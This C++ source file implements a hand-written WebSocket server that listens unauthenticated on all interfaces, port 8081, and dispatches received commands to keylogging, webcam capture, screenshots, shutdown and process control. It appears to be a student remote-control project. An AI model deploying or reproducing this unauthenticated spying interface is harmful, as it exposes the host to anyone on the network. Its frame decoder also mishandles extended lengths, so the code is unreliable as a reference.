
#include <WinSock2.h>
#include <ws2tcpip.h>
#include <iostream>
#include <string>
#include <fstream>
#include <thread>
#include <vector>
#include <atomic>

#include "Socket.h"
#include "CommandFactory.h"
#include "Webcam.h"
#include "SystemControl.h"
#include "Sender.h"
#include "AllCommand.h"
#include "WSDataType.h"

#pragma comment(lib, "ws2_32.lib")

static const char b64_table[] =
"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";


std::string base64Encode(const unsigned char* data, size_t len)
{
    std::string out;
    out.reserve((len + 2) / 3 * 4);

    for (size_t i = 0; i < len; i += 3) {
        unsigned int v = (data[i] << 16);
        if (i + 1 < len) v |= (data[i + 1] << 8);
        if (i + 2 < len) v |= (data[i + 2]);

        out.push_back(b64_table[(v >> 18) & 0x3F]);
        out.push_back(b64_table[(v >> 12) & 0x3F]);
        out.push_back((i + 1 < len) ? b64_table[(v >> 6) & 0x3F] : '=');
        out.push_back((i + 2 < len) ? b64_table[(v >> 0) & 0x3F] : '=');
    }

    return out;
}

class SHA1 {
public:
    SHA1() { reset(); }

    void update(const std::string& s) {
        for (unsigned char c : s)
            update(c);
    }

    void update(unsigned char c) {
        buffer[buf_len++] = c;
        if (buf_len == 64) {
            transform();
            buf_len = 0;
            transforms++;
        }
    }

    std::string final() {
        unsigned long long total_bits = (transforms * 512ULL) + (buf_len * 8ULL);

        update(0x80);
        while (buf_len != 56)
            update(0x00);

        for (int i = 7; i >= 0; i--)
            update((unsigned char)((total_bits >> (i * 8)) & 0xFF));

        unsigned char digest[20];
        for (int i = 0; i < 20; i++)
            digest[i] = (state[i >> 2] >> ((3 - (i & 3)) * 8)) & 0xFF;

        return std::string((char*)digest, 20);
    }

private:
    unsigned int state[5];
    unsigned char buffer[64];
    int buf_len;
    unsigned long long transforms;

    static inline unsigned int rol(unsigned int val, int bits) {
        return (val << bits) | (val >> (32 - bits));
    }

    void reset() {
        state[0] = 0x67452301;
        state[1] = 0xEFCDAB89;
        state[2] = 0x98BADCFE;
        state[3] = 0x10325476;
        state[4] = 0xC3D2E1F0;
        buf_len = 0;
        transforms = 0;
        memset(buffer, 0, 64);
    }

    void transform() {
        unsigned int w[80];
        for (int i = 0; i < 16; i++) {
            w[i] = (buffer[i * 4] << 24)
                | (buffer[i * 4 + 1] << 16)
                | (buffer[i * 4 + 2] << 8)
                | (buffer[i * 4 + 3]);
        }

        for (int i = 16; i < 80; i++)
            w[i] = rol(w[i - 3] ^ w[i - 8] ^ w[i - 14] ^ w[i - 16], 1);

        unsigned int a = state[0], b = state[1], c = state[2], d = state[3], e = state[4];

        for (int i = 0; i < 80; i++) {
            unsigned int f, k;

            if (i < 20) { f = (b & c) | ((~b) & d); k = 0x5A827999; }
            else if (i < 40) { f = b ^ c ^ d;           k = 0x6ED9EBA1; }
            else if (i < 60) { f = (b & c) | (b & d) | (c & d); k = 0x8F1BBCDC; }
            else { f = b ^ c ^ d;           k = 0xCA62C1D6; }

            unsigned int temp = rol(a, 5) + f + e + k + w[i];
            e = d;
            d = c;
            c = rol(b, 30);
            b = a;
            a = temp;
        }

        state[0] += a;
        state[1] += b;
        state[2] += c;
        state[3] += d;
        state[4] += e;
    }
};

bool websocketHandshake(SOCKET client, const std::string& request)
{
    size_t pos = request.find("Sec-WebSocket-Key: ");
    if (pos == std::string::npos) return false;

    std::string key = request.substr(pos + 19, 24);
    std::string magic = key + "258EAFA5-E914-47DA-95CA-C5AB0DC85B11";

    SHA1 sha;
    sha.update(magic);
    std::string hash = sha.final();

    std::string accept = base64Encode((unsigned char*)hash.c_str(), hash.size());

    std::string reply =
        "HTTP/1.1 101 Switching Protocols\r\n"
        "Upgrade: websocket\r\n"
        "Connection: Upgrade\r\n"
        "Sec-WebSocket-Accept: " + accept + "\r\n\r\n";

    int ret = send(client, reply.c_str(), reply.size(), 0);
    return ret != SOCKET_ERROR;
}


std::string decodeWebSocket(const char* data, int len)
{
    if (len < 6) return "";

    int payloadLen = data[1] & 0x7F;
    int maskIndex = 2;

    if (payloadLen == 126)
        maskIndex = 4;
    else if (payloadLen == 127)
        maskIndex = 10;

    unsigned char mask[4] = {
        (unsigned char)data[maskIndex],
        (unsigned char)data[maskIndex + 1],
        (unsigned char)data[maskIndex + 2],
        (unsigned char)data[maskIndex + 3]
    };

    int dataIndex = maskIndex + 4;

    std::string out;
    out.reserve(payloadLen);

    for (int i = 0; i < payloadLen; i++)
        out.push_back(data[dataIndex + i] ^ mask[i % 4]);

    return out;
}

void handleClient(SOCKET client) {
    char buffer[2048];
    int len = recv(client, buffer, sizeof(buffer) - 1, 0);
    if (len <= 0) {
        closesocket(client);
        return;
    }
    buffer[len] = 0;

    if (!websocketHandshake(client, buffer)) {
        closesocket(client);
        return;
    }

    std::cout << "Client connected successfully!\n";

    while (true) {
        len = recv(client, buffer, sizeof(buffer), 0);
        if (len <= 0) break;

        std::string msg = decodeWebSocket(buffer, len);
        if (msg.empty()) continue;

        std::cout << "Command received: " << msg << "\n";

		// split msg to command and arguments
        std::stringstream ss(msg);
        std::string msg1 = "", msg2 = "", msg3 = "";
        ss >> msg1 >> msg2;
        std::string temp;
        while (ss >> temp) {
            if (!msg3.empty()) msg3 += " ";
            msg3 += temp;
        }
        if ((msg1 == "application" || msg1 == "process") && (msg2 == "stop" || msg2 == "start"))
            msg2 = msg2 + ' ' + msg3;

		// Run the corresponding functions from AllCommand.cpp
        if (msg1 == "webcam")   openWebcam(client, msg2);
        if (msg1 == "restart")  restartPC(client, msg1);
        if (msg1 == "shutdown") shutdownPC(client, msg1);
        if (msg1 == "key")      KeyLogger(client, msg2);
        if (msg1 == "screenshot") ScreenShot(client, msg1);
        if (msg1 == "application") ApplicationManager(client, msg1, msg2);
        if (msg1 == "process")     ProcessManager(client, msg1, msg2);
    }
    std::cout << "Client disconnected.\n";
    closesocket(client);
}

void startSocketServer() {
    WSADATA wsaData;
    WSAStartup(MAKEWORD(2, 2), &wsaData);

    SOCKET server = socket(AF_INET, SOCK_STREAM, 0);
    if (server == INVALID_SOCKET) {
        std::cerr << "Tạo socket thất bại\n";
        return;
    }

    sockaddr_in addr{};
    addr.sin_family = AF_INET;
	addr.sin_addr.s_addr = INADDR_ANY; // Listen on all interfaces
    addr.sin_port = htons(8081);

    if (bind(server, (sockaddr*)&addr, sizeof(addr)) == SOCKET_ERROR) {
        std::cerr << "Bind thất bại\n";
        closesocket(server);
        return;
    }

    listen(server, SOMAXCONN);
    std::cout << "Server is listening on port 8081 (All interfaces)...\n";

    while (true) {
        // Accepts
        SOCKET client = accept(server, nullptr, nullptr);
        if (client != INVALID_SOCKET) {
            std::thread(handleClient, client).detach();
            std::cout << "New client accepted and detached.\n";
        }
    }

    closesocket(server);
    WSACleanup();
}